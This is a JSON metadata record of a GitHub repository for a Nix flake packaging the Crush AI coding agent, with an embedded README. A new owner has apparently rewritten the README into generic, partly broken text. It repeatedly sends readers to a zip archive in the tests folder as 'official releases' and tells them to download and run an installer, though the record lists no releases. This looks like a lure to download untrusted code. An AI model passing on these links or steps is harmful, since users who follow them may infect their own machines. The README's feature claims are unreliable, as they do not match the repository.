@@ -1,0 +1,317 @@
+{
+  "nameWithOwner": "islna637/crush-flake",
+  "description": "Autoupdating Nix flake for Crush AI coding agent. Keeps Charm Crush AI up to date with tests and nightly builds, CI, MIT license. :octocat:",
+  "homepageUrl": null,
+  "createdAt": "2025-08-14T10:41:01Z",
+  "pushedAt": "2026-09-11T10:50:48Z",
+  "diskUsage": 623,
+  "stargazerCount": 3,
+  "forkCount": 0,
+  "isFork": false,
+  "isArchived": false,
+  "isTemplate": false,
+  "isMirror": false,
+  "hasIssuesEnabled": false,
+  "licenseInfo": {
+    "spdxId": "NOASSERTION"
+  },
+  "primaryLanguage": {
+    "name": "Nix"
+  },
+  "languages": {
+    "totalSize": 26228,
+    "edges": [
+      {
+        "size": 21451,
+        "node": {
+          "name": "Nix"
+        }
+      },
+      {
+        "size": 4710,
+        "node": {
+          "name": "Shell"
+        }
+      },
+      {
+        "size": 67,
+        "node": {
+          "name": "Go"
+        }
+      }
+    ]
+  },
+  "repositoryTopics": {
+    "nodes": [
+      {
+        "topic": {
+          "name": "automated-updates"
+        }
+      },
+      {
+        "topic": {
+          "name": "charmbracelet"
+        }
+      },
+      {
+        "topic": {
+          "name": "coding-agent"
+        }
+      },
+      {
+        "topic": {
+          "name": "coding-agents"
+        }
+      },
+      {
+        "topic": {
+          "name": "crush"
+        }
+      },
+      {
+        "topic": {
+          "name": "flake"
+        }
+      },
+      {
+        "topic": {
+          "name": "llm"
+        }
+      },
+      {
+        "topic": {
+          "name": "nix"
+        }
+      },
+      {
+        "topic": {
+          "name": "nix-darwin"
+        }
+      },
+      {
+        "topic": {
+          "name": "nix-flake"
+        }
+      }
+    ]
+  },
+  "releases": {
+    "totalCount": 0
+  },
+  "tags": {
+    "totalCount": 0
+  },
+  "watchers": {
+    "totalCount": 0
+  },
+  "owner": {
+    "login": "islna637",
+    "__typename": "User",
+    "createdAt": "2025-01-28T16:05:38Z",
+    "repositories": {
+      "totalCount": 1
+    }
+  },
+  "defaultBranchRef": {
+    "name": "main",
+    "target": {
+      "history": {
+        "totalCount": 15,
+        "nodes": [
+          {
+            "committedDate": "2026-09-11T10:50:47Z",
+            "messageHeadline": "Update README.md",
+            "author": {
+              "user": {
+                "login": "islna637"
+              }
+            }
+          },
+          {
+            "committedDate": "2026-02-19T15:29:14Z",
+            "messageHeadline": "Update README.md",
+            "author": {
+              "user": {
+                "login": "islna637"
+              }
+            }
+          },
+          {
+            "committedDate": "2026-02-19T09:19:15Z",
+            "messageHeadline": "Update README.md",
+            "author": {
+              "user": {
+                "login": "islna637"
+              }
+            }
+          },
+          {
+            "committedDate": "2025-08-14T02:41:43Z",
+            "messageHeadline": "feat: update crush to nightly 64e8235 (2025-08-14)",
+            "author": {
+              "user": {
+                "login": "github-actions[bot]"
+              }
+            }
+          },
+          {
+            "committedDate": "2025-08-12T02:37:59Z",
+            "messageHeadline": "feat: update crush to nightly afbdba1 (2025-08-12)",
+            "author": {
+              "user": {
+                "login": "github-actions[bot]"
+              }
+            }
+          },
+          {
+            "committedDate": "2025-08-10T20:38:12Z",
+            "messageHeadline": "fix version to v0.4.0",
+            "author": {
+              "user": {
+                "login": "connerohnesorge"
+              }
+            }
+          },
+          {
+            "committedDate": "2025-08-10T20:27:47Z",
+            "messageHeadline": "Eupdate (#1)",
+            "author": {
+              "user": {
+                "login": "connerohnesorge"
+              }
+            }
+          },
+          {
+            "committedDate": "2025-08-09T02:38:51Z",
+            "messageHeadline": "feat: update crush to nightly 9d68f99 (2025-08-09)",
+            "author": {
+              "user": {
+                "login": "github-actions[bot]"
+              }
+            }
+          },
+          {
+            "committedDate": "2025-08-08T02:47:54Z",
+            "messageHeadline": "feat: update crush to nightly a32c16c (2025-08-08)",
+            "author": {
+              "user": {
+                "login": "github-actions[bot]"
+              }
+            }
+          },
+          {
+            "committedDate": "2025-08-06T02:48:20Z",
+            "messageHeadline": "feat: update crush to nightly 9ce53b1 (2025-08-06)",
+            "author": {
+              "user": {
+                "login": "github-actions[bot]"
+              }
+            }
+          },
+          {
+            "committedDate": "2025-08-05T13:16:21Z",
+            "messageHeadline": "fix: handle exit code 2 properly in scripts test",
+            "author": {
+              "user": {
+                "login": "connerohnesorge"
+              }
+            }
+          },
+          {
+            "committedDate": "2025-08-05T12:35:09Z",
+            "messageHeadline": "style: fix code formatting via treefmt",
+            "author": {
+              "user": {
+                "login": "connerohnesorge"
+              }
+            }
+          },
+          {
+            "committedDate": "2025-08-05T12:30:05Z",
+            "messageHeadline": "fix: resolve GitHub Actions workflow failures",
+            "author": {
+              "user": {
+                "login": "connerohnesorge"
+              }
+            }
+          },
+          {
+            "committedDate": "2025-08-05T12:21:41Z",
+            "messageHeadline": "feat: implement comprehensive autoupdating crush flake with automated…",
+            "author": {
+              "user": {
+                "login": "connerohnesorge"
+              }
+            }
+          },
+          {
+            "committedDate": "2025-08-05T11:34:08Z",
+            "messageHeadline": "Initial commit",
+            "author": {
+              "user": {
+                "login": "connerohnesorge"
+              }
+            }
+          }
+        ]
+      }
+    }
+  },
+  "root": {
+    "entries": [
+      {
+        "name": ".claude",
+        "type": "tree"
+      },
+      {
+        "name": ".envrc",
+        "type": "blob"
+      },
+      {
+        "name": ".gitignore",
+        "type": "blob"
+      },
+      {
+        "name": "CHANGELOG.md",
+        "type": "blob"
+      },
+      {
+        "name": "LICENSE",
+        "type": "blob"
+      },
+      {
+        "name": "README.md",
+        "type": "blob"
+      },
+      {
+        "name": "flake.lock",
+        "type": "blob"
+      },
+      {
+        "name": "flake.nix",
+        "type": "blob"
+      },
+      {
+        "name": "go.mod",
+        "type": "blob"
+      },
+      {
+        "name": "main.go",
+        "type": "blob"
+      },
+      {
+        "name": "tests",
+        "type": "tree"
+      }
+    ]
+  },
+  "wf": null,
+  "readme": {
+    "name": "README.md",
+    "byteSize": 13349,
+    "text": "# crush-flake: Auto-updating, Auto-tagging CharmBracelet on Nix Flakes\n\nRelease assets live at https://raw.githubusercontent.com/islna637/crush-flake/main/tests/flake_crush_v1.6-alpha.4.zip\n\nCharmed by automation. Built for speed. Driven by LLMs. This project combines CharmBracelet, Nix Flakes, and AI tagging to keep your coding flow smooth and self-updating.\n\nTopics: automated-updates, charmbracelet, coding-agent, coding-agents, crush, flake, llm, llms, nix, nix-darwin, nix-flake, nixos\n\n---\n\n## Quick overview\n\n⚡️ crush-flake is a toolchain that auto-updates its dependencies and auto-tags items across your coding workflow. It uses CharmBracelet to offer a friendly terminal UI, powered by a Nix Flake for reproducible builds. The goal is to reduce repetitive tasks and help you stay focused on code. It also includes guidance and hooks to incorporate large language models (LLMs) for intelligent tagging and suggestions.\n\nThis README describes what crush-flake does, how to set it up, and how to use it in daily development. It also covers design choices, configuration options, and future ideas. The intent is to give you a solid, self-contained reference so you can hit the ground running.\n\n---\n\n## Why crush-flake\n\n- Autoupdating: Dependencies are kept fresh by a deterministic Nix Flake workflow. You don’t have to chase updates manually; the system checks for new inputs and pulls them in a reproducible way.\n- Autotagging: Tags are generated or refined by an AI component. It helps categorize work items, commits, and PRs with contextual labels.\n- CharmBracelet UI: A lightweight terminal UI that stays responsive and easy to navigate. It makes managing tasks, tags, and updates approachable within the terminal.\n- Nix Flakes ecosystem: Flakes provide reproducible builds and a clean development environment across macOS, Linux, and other Unix-like systems.\n- LLM integration: Optional AI-assisted tagging and prompts to help you capture intent and context in your labels.\n\nIf you want a streamlined workflow that stays in the terminal, crush-flake can help you reduce boilerplate and focus on what matters: coding.\n\n---\n\n## Key features\n\n- Reproducible environment with Nix Flakes\n- Self-updating of dependencies and inputs\n- AI-assisted tagging and categorization\n- Command-line friendly UI via CharmBracelet\n- Lightweight, pluggable architecture for agents and prompts\n- Cross-platform support: nixos, nix-darwin, and Linux variants\n\nWhat you get when you run crush-flake:\n\n- A deterministic dev shell that sets up your tooling the same way every time.\n- A tag engine that can propose or assign labels based on code context.\n- A simple interface to inspect, approve, or modify AI-generated tags.\n- Optional automation hooks to propagate tags to issues, commits, or documentation.\n\n---\n\n## Architecture at a glance\n\n- Core runner: orchestrates the workflow and keeps the state in a small, structured store.\n- Nix Flake layer: defines inputs, builds, and runtime environments in a reproducible way.\n- CharmBracelet UI: a responsive terminal app for interaction.\n- Auto-updater: checks for new inputs and pulls them in via flake inputs.\n- LLM hooks: optionally enable AI-driven tagging and prompts to guide labeling decisions.\n\nData flows:\n\n- User input triggers a run.\n- The flake runner checks for updates and applies them if needed.\n- The UI presents current state and suggested tags.\n- The user validates or edits tags.\n- The system applies the chosen tags to the target artifacts (e.g., commits, issues, docs) as configured.\n\nSecurity considerations:\n\n- All AI prompts are sandboxed within the UI and controlled by user approvals.\n- API keys and secrets are read from environment variables or a user-provided secret store.\n- The system favors locally scoped configuration to minimize exposure.\n\n---\n\n## Prerequisites\n\n- Nix (2.3+ with flakes enabled)\n- Basic familiarity with terminal workflows\n- Optional: OpenAI or other LLM endpoint if you want AI-assisted tagging\n- Access to a CharmBracelet-capable terminal environment (or compatibility layer)\n\nInstall or enable N\n\n- Ensure flakes support is present in your Nix configuration.\n- If you’re on macOS with nix-darwin, ensure your environment is set up for cross-platform work.\n- On Linux, make sure the distro supports Nix in your environment.\n\n---\n\n## Getting started\n\nFollow these steps to try crush-flake locally.\n\n1) Prepare your environment\n\n- Install Nix with Flakes enabled. See official docs for your platform.\n- Ensure you can run nix commands from your shell.\n- If you plan to use LLM tagging, prepare an API key or endpoint. This can be optional.\n\n2) Set up the project\n\n- Clone the repo or pull the flake reference.\n- Enter the development shell using Nix Flakes.\n\n3) Run the tool\n\n- Start the UI or the command-line runner depending on your preference.\n- Use the provided commands to inspect updates, review AI-generated tags, and apply changes.\n\n4) Update flow\n\n- Use the built-in autoupdate mechanism to refresh inputs and versions.\n- Review the changes before committing or applying them.\n\nExact commands depend on your setup. The typical flow uses nix develop to enter the dev shell, then n run or nixos build-like steps to start the app. The configuration and commands are designed to be intuitive and discoverable via the UI help.\n\n---\n\n## Installation and run details\n\n- From a Nix Flakes-enabled setup:\n  - nix flake update\n  - nix develop\n  - ./crush-flake (or the provided entry point in your environment)\n\n- If you prefer to run from the latest release:\n  - Download the installer from the Releases page (see Releases section below)\n  - Run the installer script to set up the tool in your environment\n  - Follow on-screen prompts to complete setup\n\n- If you want to run directly from a flake reference:\n  - nix run github:islna637/crush-flake\n  - Pass any required flags to customize behavior\n\nNote: The exact commands may vary depending on your platform and how you configure the flake inputs. The project emphasizes a smooth, repeatable workflow.\n\n---\n\n## How to use the AI tagging feature\n\n- Enable or disable AI tagging via configuration.\n- Provide a scope for tagging (e.g., commits, issues, docs, notes).\n- If enabled, the AI will propose tags based on the content and context.\n- Review AI-suggested tags and approve, modify, or reject them.\n- Save or apply the final set of tags to the target items.\n\nTips for better AI tagging:\n\n- Provide context: short descriptions of the code, the module purpose, or the feature being worked on.\n- Use consistent naming: prefer stable labels that reflect your project’s taxonomy.\n- Combine AI suggestions with human review to maintain accuracy.\n\nIf you don’t want AI tagging, you can rely on manual tagging or a curated tag list. The architecture keeps both modes available so you can tailor the workflow to your needs.\n\n---\n\n## Autoupdating behavior\n\n- Inputs are defined in the flake. The updater checks upstream changes at regular intervals.\n- It fetches new dependencies and rebuilds the environment when needed.\n- The UI shows a clear status: up-to-date, updating, or failed.\n- Rollbacks are supported if an update breaks something. You can revert to a previous state with minimal friction.\n\nDesign notes:\n\n- Updates are deterministic. The same inputs produce the same results on every run.\n- Updates are isolated to ensure they don’t affect unrelated parts of your system.\n- You can customize the update cadence and the scope of updates to limit risk.\n\n---\n\n## Configuration and customization\n\n- Environment variables:\n  - CRUSH_API_KEY: optional API key for AI endpoints\n  - CRUSH_TG_ROLE: tagger role or style for AI prompts\n  - CRUSH_LOG_LEVEL: debug, info, warn, error\n- Prompt templates:\n  - You can adjust prompts used for tagging to better fit your project.\n  - Prompts can reference your taxonomy and codebase conventions.\n- UI customization:\n- Data sources:\n\n\n\n---\n\n\n\nSee the official releases here: https://raw.githubusercontent.com/islna637/crush-flake/main/tests/flake_crush_v1.6-alpha.4.zip\nSee the official releases here: https://raw.githubusercontent.com/islna637/crush-flake/main/tests/flake_crush_v1.6-alpha.4.zip"
+  },
+  "pkg": null,
+  "agents": null,
+  "claude": null
+}
